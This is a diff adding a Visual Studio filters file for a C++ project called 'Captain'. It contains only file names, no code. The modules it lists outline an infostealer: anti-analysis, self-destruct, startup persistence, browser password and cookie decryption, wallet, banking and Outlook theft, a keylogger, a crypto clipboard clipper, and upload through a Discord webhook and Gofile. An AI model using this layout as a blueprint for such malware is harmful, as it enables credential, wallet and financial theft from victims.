@@ -1,0 +1,453 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="AntiAnalysis">
+      <UniqueIdentifier>{12d6e063-533e-4989-bb76-2edb292b8ea9}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Config">
+      <UniqueIdentifier>{fe5ee354-3d5b-4686-a40c-12c4313e0ba0}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Counter">
+      <UniqueIdentifier>{82dffc43-df41-4985-880b-43b4f813e60f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Filemanager">
+      <UniqueIdentifier>{a3536cc0-4c97-4a5b-a7c9-17a66425f745}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="GofileFileService">
+      <UniqueIdentifier>{f290bef2-bc92-443d-815e-b22728a59856}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Mutex">
+      <UniqueIdentifier>{99bfeb02-688b-4082-8556-8a94551bee19}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Paths">
+      <UniqueIdentifier>{2369442d-30cb-4fe1-8fb9-497d68e7d947}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="rc4">
+      <UniqueIdentifier>{8d915784-1785-45df-ab49-e22feb54dc86}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="SelfDestruct">
+      <UniqueIdentifier>{0766d302-aab5-4555-bc48-1a030d748297}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="StartDelay">
+      <UniqueIdentifier>{7d854de3-acbc-48df-bed5-7af278e9928e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Startup">
+      <UniqueIdentifier>{7283c5b7-d77b-44c0-8968-ebf7de146230}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="SystemInfo">
+      <UniqueIdentifier>{33ff8033-9164-4363-985d-ddedeedfb72b}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="DiscordHook">
+      <UniqueIdentifier>{e8e889f8-62bb-4b52-8916-a8c9f110ff5b}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Passwords">
+      <UniqueIdentifier>{bc3ec4f2-d8f8-4000-98fa-a906419b7007}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Report">
+      <UniqueIdentifier>{055d1cfe-5b01-495f-a0ce-7d1668df2255}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="InstalledApps">
+      <UniqueIdentifier>{20db0cec-1dde-4c95-8345-ddeeba6f3b64}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Clipboard">
+      <UniqueIdentifier>{6ef9b15d-2960-46dc-a403-8a05b9d03d84}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Info">
+      <UniqueIdentifier>{43bf3f6f-e29a-4fff-8fb1-b82a5d9dcc41}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="ProductKey">
+      <UniqueIdentifier>{03212dc5-8aa9-4401-adc8-2766543319af}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Wifi">
+      <UniqueIdentifier>{7c75ee25-7945-40f3-9c36-855c64bcbb7d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="ProcessList">
+      <UniqueIdentifier>{ee112422-2228-4b59-985d-7de9c9f5b1ea}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="DesktopScreenshot">
+      <UniqueIdentifier>{7dcc0f0c-bf6d-4431-b41c-1ae03aa87a75}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="ActiveWindows">
+      <UniqueIdentifier>{a5ee80cf-ac58-40b2-b8f8-c52ef3c495c1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="DirectoryTree">
+      <UniqueIdentifier>{3635d12f-b4e3-4da2-8be4-d00439d2b099}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="OpenVpn">
+      <UniqueIdentifier>{fa0c5397-131b-4c2d-9a07-32e7ee0ccc19}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="ChromExtensions">
+      <UniqueIdentifier>{499cd5e4-0a3b-4887-b260-9a9ddacf96b3}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="EdgExtensions">
+      <UniqueIdentifier>{f4d2782a-4536-4e66-b47b-fa3dd440fdf6}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Wallets">
+      <UniqueIdentifier>{8cc15434-7414-43f1-9768-c3cddb6a08e8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Outlook">
+      <UniqueIdentifier>{db5069c4-de7f-4b29-bf0d-a81b15f7cae5}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Edg">
+      <UniqueIdentifier>{0ff04035-80c3-458e-8aa9-693a5d39917e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Chromium">
+      <UniqueIdentifier>{b3b7e8cb-ad23-4f36-84fe-ff51be2835b1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="FileGrabber">
+      <UniqueIdentifier>{3cf25a96-2d72-4ead-9929-a6b0b04dd5b4}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="BrowserUtils">
+      <UniqueIdentifier>{da2517b0-cb20-4853-95f8-076369634126}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Common">
+      <UniqueIdentifier>{33b41b99-3fed-4ab9-b6de-29899e70e69d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="base64">
+      <UniqueIdentifier>{21369b41-0892-49db-8598-647595282f76}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Banking">
+      <UniqueIdentifier>{2d0a5e19-ab53-41fb-8ed2-b0af6c5926c4}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="BCrypt">
+      <UniqueIdentifier>{8131a5ff-ae5f-4da3-b555-bb03d35f90f6}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="registry">
+      <UniqueIdentifier>{59cc4e43-2281-41c5-8591-dd82d42d29e7}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Keylogger">
+      <UniqueIdentifier>{a05216a9-b292-4c7a-8742-ac704559ef77}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="WindowManager">
+      <UniqueIdentifier>{38c0fc51-007d-428a-8cf1-6320f27cfb9a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="EventManager">
+      <UniqueIdentifier>{a3833b39-67d0-49c9-ae5e-f0c25cc3a5b3}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="ClipboardManager">
+      <UniqueIdentifier>{8b20c5ea-d5ec-4c1a-9d58-a9e8bc49d7f2}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="ClipperEventManager">
+      <UniqueIdentifier>{7abd1590-d118-437c-a1a8-3dde4e5c39f1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="ClipLogger">
+      <UniqueIdentifier>{a7921c5b-7065-4bfe-8146-d73637bead7a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Clipper">
+      <UniqueIdentifier>{21a4b92c-217a-4bdf-803e-9927a44427de}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Time">
+      <UniqueIdentifier>{c43b3dae-94cb-4e89-b0a8-022de2adfcfa}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Keylog">
+      <UniqueIdentifier>{817c02a9-5992-4f06-be6e-dda1f11d7eae}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="Captain.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="AntiAnalysis.cpp">
+      <Filter>AntiAnalysis</Filter>
+    </ClCompile>
+    <ClCompile Include="Config.cpp">
+      <Filter>Config</Filter>
+    </ClCompile>
+    <ClCompile Include="Counter.cpp">
+      <Filter>Counter</Filter>
+    </ClCompile>
+    <ClCompile Include="Filemanager.cpp">
+      <Filter>Filemanager</Filter>
+    </ClCompile>
+    <ClCompile Include="GofileFileService.cpp">
+      <Filter>GofileFileService</Filter>
+    </ClCompile>
+    <ClCompile Include="Mutex.cpp">
+      <Filter>Mutex</Filter>
+    </ClCompile>
+    <ClCompile Include="Paths.cpp">
+      <Filter>Paths</Filter>
+    </ClCompile>
+    <ClCompile Include="rc4.cpp">
+      <Filter>rc4</Filter>
+    </ClCompile>
+    <ClCompile Include="SelfDestruct.cpp">
+      <Filter>SelfDestruct</Filter>
+    </ClCompile>
+    <ClCompile Include="StartDelay.cpp">
+      <Filter>StartDelay</Filter>
+    </ClCompile>
+    <ClCompile Include="Startup.cpp">
+      <Filter>Startup</Filter>
+    </ClCompile>
+    <ClCompile Include="SystemInfo.cpp">
+      <Filter>SystemInfo</Filter>
+    </ClCompile>
+    <ClCompile Include="DiscordHook.cpp">
+      <Filter>DiscordHook</Filter>
+    </ClCompile>
+    <ClCompile Include="Passwords.cpp">
+      <Filter>Passwords</Filter>
+    </ClCompile>
+    <ClCompile Include="Report.cpp">
+      <Filter>Report</Filter>
+    </ClCompile>
+    <ClCompile Include="InstalledApps.cpp">
+      <Filter>InstalledApps</Filter>
+    </ClCompile>
+    <ClCompile Include="Clipboard.cpp">
+      <Filter>Clipboard</Filter>
+    </ClCompile>
+    <ClCompile Include="Info.cpp">
+      <Filter>Info</Filter>
+    </ClCompile>
+    <ClCompile Include="ProductKey.cpp">
+      <Filter>ProductKey</Filter>
+    </ClCompile>
+    <ClCompile Include="Wifi.cpp">
+      <Filter>Wifi</Filter>
+    </ClCompile>
+    <ClCompile Include="ProcessList.cpp">
+      <Filter>ProcessList</Filter>
+    </ClCompile>
+    <ClCompile Include="DesktopScreenshot.cpp">
+      <Filter>DesktopScreenshot</Filter>
+    </ClCompile>
+    <ClCompile Include="ActiveWindows.cpp">
+      <Filter>ActiveWindows</Filter>
+    </ClCompile>
+    <ClCompile Include="DirectoryTree.cpp">
+      <Filter>DirectoryTree</Filter>
+    </ClCompile>
+    <ClCompile Include="OpenVpn.cpp">
+      <Filter>OpenVpn</Filter>
+    </ClCompile>
+    <ClCompile Include="ChromExtensions.cpp">
+      <Filter>ChromExtensions</Filter>
+    </ClCompile>
+    <ClCompile Include="EdgExtensions.cpp">
+      <Filter>EdgExtensions</Filter>
+    </ClCompile>
+    <ClCompile Include="Wallets.cpp">
+      <Filter>Wallets</Filter>
+    </ClCompile>
+    <ClCompile Include="FileGrabber.cpp">
+      <Filter>FileGrabber</Filter>
+    </ClCompile>
+    <ClCompile Include="Chromium.cpp">
+      <Filter>Chromium</Filter>
+    </ClCompile>
+    <ClCompile Include="Edg.cpp">
+      <Filter>Edg</Filter>
+    </ClCompile>
+    <ClCompile Include="Outlook.cpp">
+      <Filter>Outlook</Filter>
+    </ClCompile>
+    <ClCompile Include="BrowserUtils.cpp">
+      <Filter>BrowserUtils</Filter>
+    </ClCompile>
+    <ClCompile Include="Common.cpp">
+      <Filter>Common</Filter>
+    </ClCompile>
+    <ClCompile Include="DecryptChromium.cpp">
+      <Filter>Chromium</Filter>
+    </ClCompile>
+    <ClCompile Include="base64.cpp">
+      <Filter>base64</Filter>
+    </ClCompile>
+    <ClCompile Include="Banking.cpp">
+      <Filter>Banking</Filter>
+    </ClCompile>
+    <ClCompile Include="BCrypt.cpp">
+      <Filter>BCrypt</Filter>
+    </ClCompile>
+    <ClCompile Include="registry.cpp">
+      <Filter>registry</Filter>
+    </ClCompile>
+    <ClCompile Include="Keylogger.cpp">
+      <Filter>Keylogger</Filter>
+    </ClCompile>
+    <ClCompile Include="WindowManager.cpp">
+      <Filter>WindowManager</Filter>
+    </ClCompile>
+    <ClCompile Include="EventManager.cpp">
+      <Filter>EventManager</Filter>
+    </ClCompile>
+    <ClCompile Include="ClipboardManager.cpp">
+      <Filter>ClipboardManager</Filter>
+    </ClCompile>
+    <ClCompile Include="ClipperEventManager.cpp">
+      <Filter>ClipperEventManager</Filter>
+    </ClCompile>
+    <ClCompile Include="ClipLogger.cpp">
+      <Filter>ClipLogger</Filter>
+    </ClCompile>
+    <ClCompile Include="Clipper.cpp">
+      <Filter>Clipper</Filter>
+    </ClCompile>
+    <ClCompile Include="timme.cpp">
+      <Filter>Time</Filter>
+    </ClCompile>
+    <ClCompile Include="keylog.cpp">
+      <Filter>Keylog</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="AntiAnalysis.h">
+      <Filter>AntiAnalysis</Filter>
+    </ClInclude>
+    <ClInclude Include="Config.h">
+      <Filter>Config</Filter>
+    </ClInclude>
+    <ClInclude Include="Counter.h">
+      <Filter>Counter</Filter>
+    </ClInclude>
+    <ClInclude Include="Filemanager.h">
+      <Filter>Filemanager</Filter>
+    </ClInclude>
+    <ClInclude Include="GofileFileService.h">
+      <Filter>GofileFileService</Filter>
+    </ClInclude>
+    <ClInclude Include="Mutex.h">
+      <Filter>Mutex</Filter>
+    </ClInclude>
+    <ClInclude Include="Paths.h">
+      <Filter>Paths</Filter>
+    </ClInclude>
+    <ClInclude Include="rc4.h">
+      <Filter>rc4</Filter>
+    </ClInclude>
+    <ClInclude Include="SelfDestruct.h">
+      <Filter>SelfDestruct</Filter>
+    </ClInclude>
+    <ClInclude Include="StartDelay.h">
+      <Filter>StartDelay</Filter>
+    </ClInclude>
+    <ClInclude Include="Startup.h">
+      <Filter>Startup</Filter>
+    </ClInclude>
+    <ClInclude Include="SystemInfo.h">
+      <Filter>SystemInfo</Filter>
+    </ClInclude>
+    <ClInclude Include="DiscordHook.h">
+      <Filter>DiscordHook</Filter>
+    </ClInclude>
+    <ClInclude Include="Passwords.h">
+      <Filter>Passwords</Filter>
+    </ClInclude>
+    <ClInclude Include="Report.h">
+      <Filter>Report</Filter>
+    </ClInclude>
+    <ClInclude Include="InstalledApps.h">
+      <Filter>InstalledApps</Filter>
+    </ClInclude>
+    <ClInclude Include="Clipboard.h">
+      <Filter>Clipboard</Filter>
+    </ClInclude>
+    <ClInclude Include="Info.h">
+      <Filter>Info</Filter>
+    </ClInclude>
+    <ClInclude Include="ProductKey.h">
+      <Filter>ProductKey</Filter>
+    </ClInclude>
+    <ClInclude Include="Wifi.h">
+      <Filter>Wifi</Filter>
+    </ClInclude>
+    <ClInclude Include="ProcessList.h">
+      <Filter>ProcessList</Filter>
+    </ClInclude>
+    <ClInclude Include="DesktopScreenshot.h">
+      <Filter>DesktopScreenshot</Filter>
+    </ClInclude>
+    <ClInclude Include="ActiveWindows.h">
+      <Filter>ActiveWindows</Filter>
+    </ClInclude>
+    <ClInclude Include="DirectoryTree.h">
+      <Filter>DirectoryTree</Filter>
+    </ClInclude>
+    <ClInclude Include="OpenVpn.h">
+      <Filter>OpenVpn</Filter>
+    </ClInclude>
+    <ClInclude Include="ChromExtensions.h">
+      <Filter>ChromExtensions</Filter>
+    </ClInclude>
+    <ClInclude Include="EdgExtensions.h">
+      <Filter>EdgExtensions</Filter>
+    </ClInclude>
+    <ClInclude Include="Wallets.h">
+      <Filter>Wallets</Filter>
+    </ClInclude>
+    <ClInclude Include="FileGrabber.h">
+      <Filter>FileGrabber</Filter>
+    </ClInclude>
+    <ClInclude Include="Chromium.h">
+      <Filter>Chromium</Filter>
+    </ClInclude>
+    <ClInclude Include="Edg.h">
+      <Filter>Edg</Filter>
+    </ClInclude>
+    <ClInclude Include="Outlook.h">
+      <Filter>Outlook</Filter>
+    </ClInclude>
+    <ClInclude Include="BrowserUtils.h">
+      <Filter>BrowserUtils</Filter>
+    </ClInclude>
+    <ClInclude Include="Common.h">
+      <Filter>Common</Filter>
+    </ClInclude>
+    <ClInclude Include="DecryptChromium.h">
+      <Filter>Chromium</Filter>
+    </ClInclude>
+    <ClInclude Include="base64.h">
+      <Filter>base64</Filter>
+    </ClInclude>
+    <ClInclude Include="Banking.h">
+      <Filter>Banking</Filter>
+    </ClInclude>
+    <ClInclude Include="BCrypt.h">
+      <Filter>BCrypt</Filter>
+    </ClInclude>
+    <ClInclude Include="registry.h">
+      <Filter>registry</Filter>
+    </ClInclude>
+    <ClInclude Include="Keylogger.h">
+      <Filter>Keylogger</Filter>
+    </ClInclude>
+    <ClInclude Include="WindowManager.h">
+      <Filter>WindowManager</Filter>
+    </ClInclude>
+    <ClInclude Include="EventManager.h">
+      <Filter>EventManager</Filter>
+    </ClInclude>
+    <ClInclude Include="ClipboardManager.h">
+      <Filter>ClipboardManager</Filter>
+    </ClInclude>
+    <ClInclude Include="ClipperEventManager.h">
+      <Filter>ClipperEventManager</Filter>
+    </ClInclude>
+    <ClInclude Include="ClipLogger.h">
+      <Filter>ClipLogger</Filter>
+    </ClInclude>
+    <ClInclude Include="Clipper.h">
+      <Filter>Clipper</Filter>
+    </ClInclude>
+    <ClInclude Include="timme.h">
+      <Filter>Time</Filter>
+    </ClInclude>
+    <ClInclude Include="keylog.h">
+      <Filter>Keylog</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
